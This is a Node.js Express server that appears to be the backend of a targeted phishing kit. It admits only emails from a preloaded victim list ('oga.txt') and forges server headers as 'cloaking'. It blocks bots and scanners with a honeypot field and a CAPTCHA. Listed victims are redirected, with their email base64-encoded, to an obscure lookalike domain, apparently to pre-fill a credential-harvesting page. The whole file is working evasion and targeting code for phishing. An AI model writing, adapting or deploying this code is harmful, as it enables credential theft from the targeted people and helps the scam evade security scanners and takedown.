require('dotenv').config();

const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const fetch = require('node-fetch');
const rateLimit = require('express-rate-limit');
const crypto = require('crypto');
const helmet = require('helmet');

const app = express();
const PORT = process.env.PORT || 3000;
const EMAIL_FILE = path.join(__dirname, 'ogas', 'oga.txt');
const REDIRECT_BASE = process.env.REDIRECT_BASE || 'https://fropnvironmeropr.up.railway.app';
const BACKEND_BASE = process.env.BACKEND_BASE || 'https://bckvirovironmentnmvironment.up.railway.app';

let validEmails = new Set();
let tokenMap = new Map();

function loadEmails() {
  try {
    const data = fs.readFileSync(EMAIL_FILE, 'utf8');
    validEmails = new Set(data.split('\n').map(e => e.trim().toLowerCase()));
    console.log('[INFO] Email list loaded into memory');
  } catch (err) {
    console.error('[ERROR] Failed to read email list:', err);
  }
}
loadEmails();

// Middleware: headers for cloaking + caching
app.use((req, res, next) => {
  res.setHeader('X-Robots-Tag', 'noindex, nofollow');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('Server', 'nginx');
  res.setHeader('X-Powered-By', 'PHP/7.4.33');
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');
  res.setHeader('Surrogate-Control', 'no-store');
  next();
});

app.use((req, res, next) => {
  if (req.headers['x-forwarded-proto'] !== 'https') {
    return res.redirect(`https://${req.headers.host}${req.url}`);
  }
  next();
});

app.use(cors({
  origin: process.env.ALLOWED_ORIGIN || 'https://fropnvironmeropr.up.railway.app',
}));
app.use(express.json());
app.use(helmet({ contentSecurityPolicy: false }));

const limiter = rateLimit({
  windowMs: 60 * 1000,
  max: 40,
  standardHeaders: true,
  legacyHeaders: false,
  message: { valid: false, message: 'Too many requests. Try again later.' },
});
app.use(limiter);

// Email validation
app.post('/api/check-email', async (req, res) => {
  const { email, captchaToken, middleName } = req.body;
  if (middleName && middleName.trim() !== '') {
    await new Promise(r => setTimeout(r, 3000));
    return res.status(403).json({ valid: false, message: 'Detected bot behavior' });
  }

  if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    return res.status(400).json({ valid: false, message: 'Invalid email format' });
  }

  if (!captchaToken) {
    return res.status(400).json({ valid: false, message: 'CAPTCHA missing' });
  }

  try {
    const verifyRes = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `secret=${process.env.CLOUDFLARE_SECRET}&response=${captchaToken}`,
    });

    const verifyData = await verifyRes.json();
    if (!verifyData.success) {
      return res.status(400).json({ valid: false, message: 'CAPTCHA failed. Reload and retry.' });
    }
  } catch {
    return res.status(500).json({ valid: false, message: 'CAPTCHA verification failed' });
  }

  const normalizedEmail = email.toLowerCase();
  if (!validEmails.has(normalizedEmail)) {
    await new Promise(r => setTimeout(r, 2000 + Math.random() * 1500));
    return res.status(404).json({ valid: false, message: 'Email not recognized' });
  }

  const token = crypto.randomBytes(16).toString('hex');
  const encoded = Buffer.from(normalizedEmail).toString('base64');
  tokenMap.set(token, { email: encoded, expires: Date.now() + 5 * 60 * 1000 });

  const redirectUrl = `${BACKEND_BASE}/forward/${token}`;
  res.json({ valid: true, redirectUrl });
});

app.get('/forward/:token', (req, res) => {
  const token = req.params.token;
  const entry = tokenMap.get(token);

  if (!entry || Date.now() > entry.expires) {
    tokenMap.delete(token);
    return res.status(403).send('Invalid or expired link.');
  }

  const destination = `${REDIRECT_BASE}/#${entry.email}`;
  tokenMap.delete(token);
  res.redirect(302, destination);
});

app.listen(PORT, () => {
  console.log(`Cloaked backend running securely on port ${PORT}`);
});
